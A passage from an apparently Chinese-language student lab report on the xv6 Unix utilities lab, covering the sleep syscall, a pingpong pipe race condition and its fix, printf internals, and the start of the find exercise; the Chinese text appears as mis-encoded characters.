<span class="type">int</span> n;</span><br><span class="line">  uint ticks0;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;n);</span><br><span class="line">  <span class="keyword">if</span>(n &lt; <span class="number">0</span>)</span><br><span class="line">    n = <span class="number">0</span>;</span><br><span class="line">  acquire(&amp;tickslock);</span><br><span class="line">  ticks0 = ticks;</span><br><span class="line">  <span class="keyword">while</span>(ticks - ticks0 &lt; n)&#123;</span><br><span class="line">    <span class="keyword">if</span>(killed(myproc()))&#123;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(&amp;ticks, &amp;tickslock);</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;tickslock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç”¨æˆ·æ€ä¸­ä¼ å…¥çš„å‚æ•°ä¼šé€šè¿‡<code>argint</code>è·å–ï¼Œ<code>n</code>å³ä»£è¡¨ç¡çœ å¤šå°‘ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œæ¯ä¸€è¿‡ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œ<code>clockintr()</code>éƒ½ä¼šä½¿å…¨å±€å˜é‡<code>ticks</code>åŠ  1ï¼Œä»¥æ­¤æ¨¡æ‹Ÿæ—¶é—´çš„å˜åŒ–ã€‚ä¸ºäº†ä¿æŠ¤å…±äº«å˜é‡<code>ticks</code>ï¼Œå®ç°ä¸­ä½¿ç”¨äº†è‡ªæ—‹é”<code>tickslock</code>æ¥ä¿æŠ¤å¯¹å˜é‡<code>ticks</code>çš„è¯»å†™ï¼Œå¦‚å‰é¢æ—¶é’Ÿä¸­æ–­å¯¹<code>ticks</code>çš„å†™æ“ä½œï¼Œä»¥åŠä¸Šé¢å¯¹<code>ticks</code>çš„è¯»æ“ä½œã€‚</p><p><code>acquire()</code>è·å¾—é”åï¼Œé€šè¿‡<code>sleep(&amp;ticks, &amp;tickslock)</code>å®ç°å•æ¬¡ tick çš„è¿›ç¨‹ç¡çœ æ¨¡æ‹Ÿã€‚è¿™ä¸ªè¿‡ç¨‹äº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼šè¿›ç¨‹å¸¦ç€é”<code>tickslock</code>ç¡çœ ï¼Œé‚£ä¹ˆæ—¶é’Ÿä¸­æ–­å°±æ— æ³•ä¿®æ”¹<code>ticks</code>ã€‚ä¸è¿‡æˆ‘ä»¬çœ‹<code>sleep</code>çš„å®ç°å¯ä»¥çŸ¥é“ï¼Œè¿‡ç¨‹ä¼šå…ˆè·å¾—è¿›ç¨‹çš„é”<code>acquire(&amp;p-&gt;lock)</code>å†é‡Šæ”¾<code>ticks</code>çš„é” <code>release(lk)</code>ï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿæ­»é”ï¼</p><p>è¿›ç¨‹çš„é”çš„ä½œç”¨ä»¥åŠ<code>sleep</code>æ¥ä¸‹æ¥çš„å…·ä½“è¡Œä¸ºæ¶‰åŠ xv6 <code>process</code>è¿›ç¨‹æ¦‚å¿µçš„å®šä¹‰ï¼Œä¼šåœ¨æŠ¥å‘Šåé¢è§£é‡Šåˆ†æåå†å›è¿‡æ¥çœ‹<code>void sleep(void *chan, struct spinlock *lk)</code>ã€‚</p><hr><p>ä»¥ä¸‹ä¸ºæµ‹è¯•ç»“æœï¼š<br><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/sleep.png" alt="sleep.png"></p><h1 id="pingpong"><a class="markdownIt-Anchor" href="#pingpong"></a> pingpong</h1><blockquote><p>Write a user-level program that uses xv6 system calls to â€˜â€˜ping-pongâ€™â€™ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print â€œ&lt;pid&gt;: received pingâ€, where &lt;pid&gt; is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print â€œ&lt;pid&gt;: received pongâ€, and exit.</p></blockquote><p>æ³¨æ„åŒ¿åç®¡é“çš„æ•°æ®ä¼ è¾“æ˜¯å•å‘çš„ï¼Œä¸ºäº†åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´åŒå‘åœ°ä¼ é€’æ¶ˆæ¯ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸¤ä¸ªç®¡é“ï¼šä¸€ä¸ªæ•°æ®ä»çˆ¶è¿›ç¨‹æµå‘å­è¿›ç¨‹ï¼Œå¦ä¸€ä¸ªæ•°æ®ä»å­è¿›ç¨‹æµå‘çˆ¶è¿›ç¨‹ã€‚è¿‡ç¨‹ä¸ºï¼š</p><ol><li>çˆ¶è¿›ç¨‹å‘é€æ¶ˆæ¯ç»™å­è¿›ç¨‹</li><li>å­è¿›ç¨‹è¯»åˆ°æ¶ˆæ¯å¹¶å“åº”åˆ°ç»ˆç«¯</li><li>å­è¿›ç¨‹å‘é€æ¶ˆæ¯ç»™çˆ¶è¿›ç¨‹</li><li>çˆ¶è¿›ç¨‹æ¥æ”¶æ¶ˆæ¯å¹¶å“åº”åˆ°ç»ˆç«¯</li></ol><p>ç¬¬ä¸€æ¬¡å®ç°å‘ç°æ‰“å°å‡ºæ¥çš„æ¶ˆæ¯ç›¸äº’äº¤å‰ï¼Œäº§ç”Ÿ<strong>ç»ˆç«¯è¾“å‡ºç«äº‰</strong>ï¼<br><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/pingpong_failed.png" alt="pingpong_failed.png"><br>å‘ç°é—®é¢˜åæˆ‘çŒœæµ‹äº†å‡ºé”™çš„å¯èƒ½æ˜¯ xv6 æä¾›çš„ <code>read</code>/<code>write</code>æ²¡æœ‰å®ç°äº’æ–¥ï¼Œå³ä¸ä¿éšœåŸå­æ€§ï¼ˆå¯èƒ½æ€§å¾ˆå°â€¦ï¼‰ï¼Œ<strong>ç”±äº parent å’Œ child ä¹‹é—´æ²¡æœ‰åŒæ­¥</strong>ï¼Œå¯¼è‡´ä¸¤ä¸ªè¿›ç¨‹åŒæ—¶é€šè¿‡<code>printf()</code>å‘ç»ˆç«¯è¾“å‡ºï¼Œå¯¼è‡´äº† race condition ã€‚</p><p>ç”±äºæˆ‘ä»¬ä½¿ç”¨ç®¡é“ï¼ˆä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ï¼‰è¿›è¡Œè¯»å†™ï¼Œ<code>sys_read</code>å’Œ<code>sys_write</code>åˆ†åˆ«è°ƒç”¨çš„<code>fileread</code>å’Œ<code>filewrite</code>ä¼šæ¥ç€è°ƒç”¨<code>piperead</code>å’Œ<code>pipewrite</code>ã€‚åœ¨å¯¹ç®¡é“è¿›è¡Œæ“ä½œä¹‹å‰ï¼Œä¼šå°è¯•<code>acquire(&amp;pi-&gt;lock)</code>ï¼Œå› æ­¤å¯ä»¥ä¿è¯ <code>read</code>/<code>write</code>çš„åŸå­æ€§ã€‚</p><p>æ—¢ç„¶<code>read</code>/<code>write</code>æ»¡è¶³åŸå­æ€§ï¼Œé‚£å°±æ˜¯çˆ¶å­è¿›ç¨‹ä¹‹é—´åŒæ­¥çš„é€»è¾‘ç¼–å†™ä¸Šå‡ºç°äº†é—®é¢˜ï¼Œäºæ˜¯å‘ç°ç¡®å®å¦‚æ­¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// éƒ¨åˆ†é€»è¾‘ä»£ç </span></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">// Child process</span></span><br><span class="line">  read();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, getpid());</span><br><span class="line">  write();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="comment">// Parent process</span></span><br><span class="line">  write();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());   <span class="comment">// Fault!!</span></span><br><span class="line">  read();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­è¿›ç¨‹è°ƒç”¨<code>read</code>ä¼šè¢«é˜»å¡ï¼Œä½†å½“çˆ¶è¿›ç¨‹<code>write</code>æ—¶ï¼Œå­è¿›ç¨‹æ¥æ”¶æ¶ˆæ¯ï¼Œç„¶åä¸¤ä¸ªè¿›ç¨‹åŒæ—¶è°ƒç”¨<code>printf</code>å‘ç»ˆç«¯è¾“å‡ºï¼æ­£ç¡®çš„é€»è¾‘åº”è¯¥æ˜¯çˆ¶è¿›ç¨‹è°ƒç”¨<code>read</code>è¢«é˜»å¡ï¼Œç›´åˆ°å­è¿›ç¨‹<code>write</code>æ‰ä¼šè°ƒç”¨<code>printf</code>ã€‚æ­£ç¡®é€»è¾‘ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Parent process</span></span><br><span class="line">write();</span><br><span class="line">read();   <span class="comment">// Block until child call write to pipe</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());</span><br></pre></td></tr></table></figure><p><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/pingpong_succeed.png" alt="pingpong_succeed.png"></p><hr><p>å›è¿‡å¤´æ¥æˆ‘ä»¬å†çœ‹<code>printf</code>ç«äº‰çš„å…·ä½“è¿‡ç¨‹ã€‚<code>printf</code>åœ¨<code>va_start</code>è§£æå®Œå‚æ•°åˆ—è¡¨åè°ƒç”¨<code>vprintf</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/printf.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vprintf</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap)</span>&#123;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line">  <span class="type">int</span> c, i, state;</span><br><span class="line"></span><br><span class="line">  state = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; fmt[i]; i++)&#123;</span><br><span class="line">    c = fmt[i] &amp; <span class="number">0xff</span>;   <span class="comment">// Question</span></span><br><span class="line">    <span class="keyword">if</span>(state == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(c == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        state = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        putc(fd, c);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(c == <span class="string">&#x27;d&#x27;</span>)&#123;</span><br><span class="line">        printint(fd, va_arg(ap, <span class="type">int</span>), <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;l&#x27;</span>) &#123;</span><br><span class="line">        printint(fd, va_arg(ap, uint64), <span class="number">10</span>, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">        printint(fd, va_arg(ap, <span class="type">int</span>), <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;p&#x27;</span>) &#123;</span><br><span class="line">        printptr(fd, va_arg(ap, uint64));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;s&#x27;</span>)&#123;</span><br><span class="line">        s = va_arg(ap, <span class="type">char</span>*);</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="number">0</span>)</span><br><span class="line">          s = <span class="string">&quot;(null)&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(*s != <span class="number">0</span>)&#123;</span><br><span class="line">          putc(fd, *s);</span><br><span class="line">          s++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;c&#x27;</span>)&#123;</span><br><span class="line">        putc(fd, va_arg(ap, uint));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        putc(fd, c);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Unknown % sequence.  Print it to draw attention.</span></span><br><span class="line">        putc(fd, <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">        putc(fd, c);</span><br><span class="line">      &#125;</span><br><span class="line">      state = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">putc</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> c)</span>&#123;</span><br><span class="line">  write(fd, &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒå°†æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶æè¿°ç¬¦ä¸º<code>fd</code>çš„æ–‡ä»¶ä¸­ï¼Œåœ¨<code>printf</code>ä¸­ä¼ å…¥ 1ï¼Œå³æ ‡å‡†è¾“å‡ºã€‚é™¤å»è½¬ä¹‰å­—ç¬¦å¤„ç†è¿‡ç¨‹ï¼Œ<code>vprintf</code>çš„æ ¸å¿ƒæ˜¯<code>putc</code>ï¼Œå³å•ä¸ªå­—ç¬¦çš„è¾“å‡ºã€‚<code>putc</code>è°ƒç”¨<code>write</code>ç³»ç»Ÿè°ƒç”¨æ˜¯åŸå­çš„ï¼Œä½†å¯¹æ•´ä¸ªå­—ç¬¦ä¸²çš„è¾“å‡ºä¸æ˜¯åŸå­çš„ï¼Œå› æ­¤ä¸Šé¢ parent å’Œ child ä¸¤ä¸ª<code>putc</code>æµå°±äº¤æ›¿åœ¨äº†ä¸€èµ·å¹¶å‘åœ°è¾“å‡ºå­—ç¬¦ä¸²ã€‚</p><blockquote><p><code>vprintf</code>ä¸­çš„ä¸€ä¸ªç–‘é—®ï¼š<code>c = fmt[i] &amp; 0xff</code>çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä¸å£°æ˜ <code>c</code>ä¸º charï¼Ÿ</p></blockquote><p><code>c</code>è¢«å£°æ˜ä¸º int ç±»å‹ï¼Œ<code>fmt[i]</code>æ˜¯æœ‰ç¬¦å·çš„ char ç±»å‹ï¼Œå¦‚æœ<code>fmt[i]</code>æ˜¯è´Ÿæ•°ï¼ˆå¦‚<code>0x80</code>ï¼‰ï¼Œé‚£ä¹ˆç›´æ¥èµ‹ç»™ int ä¼šè¿›è¡Œç¬¦å·æ‰©å±•ï¼Œå¯¼è‡´<code>c</code>çš„å€¼å˜ä¸º<code>0xffffff80</code>ï¼Œæ˜¾ç„¶ä¸åœ¨ ASCII ç¼–ç çš„èŒƒå›´å†…ï¼ˆ0~255ï¼‰ã€‚ <code>fmt[i] &amp; 0xff</code>Â  ä¼šå¼ºåˆ¶å°† Â <code>fmt[i]</code>Â  è½¬æ¢ä¸º â€‹<strong>â€‹ æ— ç¬¦å· 8 ä½å€¼ â€‹</strong>â€‹ï¼Œæ¸…é™¤é«˜ä½ç¬¦å·æ‰©å±•ï¼Œç¡®ä¿ Â <code>c</code>Â  å§‹ç»ˆæ˜¯ Â <code>0~255</code>Â  çš„æ­£æ•°ã€‚æ­¤å¤„å£°æ˜<code>c</code>ä¸º int æ˜¯ä¸ºäº†åŒ¹é…æ ‡å‡†åº“çš„ Â <code>getc</code>/<code>putc</code> çš„è§„èŒƒ â€‹ã€‚</p><hr><h1 id="find"><a class="markdownIt-Anchor" href="#find"></a> find</h1><blockquote><p>Write a simple version of the UNIX <code>find</code> program for xv6: find all the files in a directory tree with a specific name.</p></blockquote><p>è¿™ä¸ªä»»åŠ¡çš„å®Œæˆæ¶‰åŠ xv6 æ–‡ä»¶ç³»ç»Ÿæ¥å£ä»¥åŠâ€œæ–‡ä»¶â€çš„å®šä¹‰ã€‚åœ¨å®ç°ä¹‹å‰éœ€è¦å‚è€ƒ<code>ls</code>çš„å®ç°æ¥åˆæ­¥äº†è§£ file systemã€‚</p><hr><p><strong>æ–‡ä»¶æè¿°ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//--------kernel/fs.h----------//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIRSIZ 14</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">  ushort inum;</span><br><span class="line">  <span class="type">char</span> name[DIRSIZ];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//------------------------------//</span></span><br><span class="line"><span class="comment">//--------kernel/stat.h---------//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_DIR     1   <span class="comment">// Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_FILE    2   <span class="comment">// File</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_DEVICE  3   <span class="comment">// Device</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> dev;     <span class="comment">// File system&#x27;s disk device</span></span><br><span class="line">  uint ino;    <span class="comment">// Inode number</span></span><br><span class="line">  <span class="type">short</span> type;  <span class="comment">// Type of file</span></span><br><span class="line">  <span class="type">short</span> nlink; <span class="comment">// Number of links to file</span></span><br><span class="line">  uint64 size; <span class="comment">// Size of file in bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åä¸èƒ½å”¯ä¸€æè¿°æ–‡ä»¶æœ¬èº«ï¼Œå¯¹äºæ¯ä¸ªæ–‡ä»¶ä½¿ç”¨å”¯ä¸€çš„<code>inode</code>ï¼ˆ32-bits æ— ç¬¦å· intï¼‰æ¥é™å®šã€‚Unix å°†èµ„æºè§†ä½œæ–‡ä»¶ï¼Œå› æ­¤è®¾å¤‡ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ï¼Œé€šè¿‡<code>T_DEVICE</code>æ¥å®šä¹‰ã€‚åŒæ—¶ï¼Œæ–‡ä»¶å¤¹ä¹Ÿæ˜¯ä¸€ç§æ–‡ä»¶ï¼ˆ<code>T_DIR</code>ï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªç›®å½•æ¡ç›®<code>dirent</code>çš„åºåˆ—ï¼Œå…¶ä¸­æ¯ä¸ª<code>dirent</code>æ˜¯<code>inode</code>å¼•ç”¨å’Œæ–‡ä»¶å<code>name</code>çš„åºåˆ—å¯¹ã€‚æ–‡ä»¶çŠ¶æ€<code>stat</code>ä¸­çš„å­—æ®µ<code>nlink</code>æ˜¯æŒ‡æ‰€æœ‰è¿æ¥åˆ°è¯¥<code>inode</code>ä¸Šçš„æ–‡ä»¶ï¼Œå¯¹è¿™äº›æ–‡ä»¶çš„æ‰€æœ‰æ“ä½œéƒ½ä¼šæ˜ å°„åˆ°åŒä¸€ inode ä¸Šã€‚</p><p><strong>æ–‡ä»¶ç³»ç»Ÿæ¥å£ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// system call</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>, <span class="type">void</span>*, <span class="type">int</span>)</span>;            <span class="comment">// âˆš</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span>)</span>;                       <span class="comment">// âˆš</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>)</span>;           <span class="comment">// âˆš</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mknod</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">short</span>, <span class="type">short</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlink</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> stat*)</span>;      <span class="comment">// âˆš</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">link</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mkdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">chdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ulib.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">stat</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="keyword">struct</span> stat*)</span>;  <span class="comment">// âˆš</span></span><br></pre></td></tr></table></figure><ol><li><code>open</code> ä¸ <code>fstat</code> ç³»ç»Ÿè°ƒç”¨çš„è§£è€¦ä»¥åŠç”¨æˆ·æ€<code>stat</code>åº“å‡½æ•°ï¼š</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/ls.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ls</span><span class="params">(<span class="type">char</span> *path)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(st.type)&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">case</span> T_DIR:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line">      <span class="keyword">if</span>(de.inum == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      memmove(p, de.name, DIRSIZ);</span><br><span class="line">      p[DIRSIZ] = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">// <span class="doctag">NOTE:</span> buf is the path to file</span></span><br><span class="line">      <span class="keyword">if</span>(stat(buf, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ls: cannot stat %s\n&quot;</span>, buf);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ ls çš„æŸ¥è¯¢æ–‡ä»¶å®ä¾‹ä¸­ï¼Œä¼ å…¥çš„<code>path</code>ä¼šè¢«ä½œä¸º<code>open</code>ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼ŒæˆåŠŸæ‰“å¼€æ–‡ä»¶å¾—åˆ°æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptï¼‰ã€‚æ¥ä¸‹æ¥è°ƒç”¨<code>fstat</code>çš„ç³»ç»Ÿè°ƒç”¨ä¼šè§£æè¯¥æ–‡ä»¶çš„çŠ¶æ€<code>stat</code>ï¼Œè¿™é‡Œæˆ‘ä»¬æœ€å…³å¿ƒçš„å­—æ®µæ˜¯æ–‡ä»¶ç±»å‹ <code>type</code> ã€‚</p><p>æ ¹æ®æ–‡ä»¶çš„ä¸åŒç±»å‹å¯¹æ–‡ä»¶ä¿¡æ¯çš„è¾“å‡ºä¹Ÿä¸åŒã€‚å¦‚æœæ˜¯æ–‡ä»¶ç›®å½•çš„è¯ï¼Œæˆ‘ä»¬éœ€è¦éå†è¯¥ç›®å½•ï¼š<code>while(read(fd, &amp;de, sizeof(de)) == sizeof(de))</code>ã€‚æ¯æ¬¡<code>read</code>è¯»å–ä¸€ä¸ªç›®å½•æ¡ç›®å¹¶å†™åœ¨ <code>struct stat de</code>ä¸­ã€‚ä¹‹åä¸€ç³»åˆ—å¯¹<code>buf</code>å†™å…¥çš„ç»“æœæ˜¯å®ƒä¿å­˜äº†æºç›®å½•ä¸‹çš„å•ä¸ªæ–‡ä»¶ï¼ˆå½“ç„¶å®ƒå¯ä»¥æ˜¯æ–‡ä»¶ï¼Œè®¾å¤‡æˆ–è€…å­ç›®å½•ï¼‰ã€‚</p><p>ä¸ºäº†ç»§ç»­è¯»å–è¯¥æ–‡ä»¶çš„çŠ¶æ€ï¼ŒåŸæœ¬åº”è¯¥åƒä¸€å¼€å§‹ä¸€æ ·å…ˆæ‰“å¼€æ–‡ä»¶å†è§£æï¼Œè€Œ <code>ls</code> ç›´æ¥è°ƒç”¨äº†ä¸€ä¸ªåº“å‡½æ•° <code>stat</code>ï¼Œå®ƒå®é™…ä¸Šå°±æ˜¯å°è£…äº† <code>open</code> ï¼Œ<code>fstat</code> å’Œ <code>close</code> ä¸‰ä¸ª syscall ã€‚</p><ol start="2"><li>å†çœ‹ç³»ç»Ÿè°ƒç”¨ <code>read</code></li></ol><ul><li>å¯¹äºæ–‡ä»¶çš„ readï¼š<br>åœ¨<code>find</code>çš„å®ç°ä¸­ï¼Œå¯¹äº<code>T_FILE</code>çš„å¤„ç†æˆ‘ç…§æ¬äº† <code>read(fd, &amp;de, sizeof(de))</code> ï¼Œä½¿å¾—æŸ¥è¯¢é€»è¾‘å‡ºé”™ã€‚å®é™…ä¸Šå¯¹äº file æˆ‘æ²¡æœ‰å¿…è¦å»è§£ææ–‡ä»¶çŠ¶æ€ï¼ˆéœ€è¦çš„è¯å®é™…ä¸Šä¹Ÿå› è¯¥æ˜¯ç”¨ <code>stat</code> ï¼‰ï¼Œç›´æ¥æå– <code>path</code> ä¸­çš„ base name 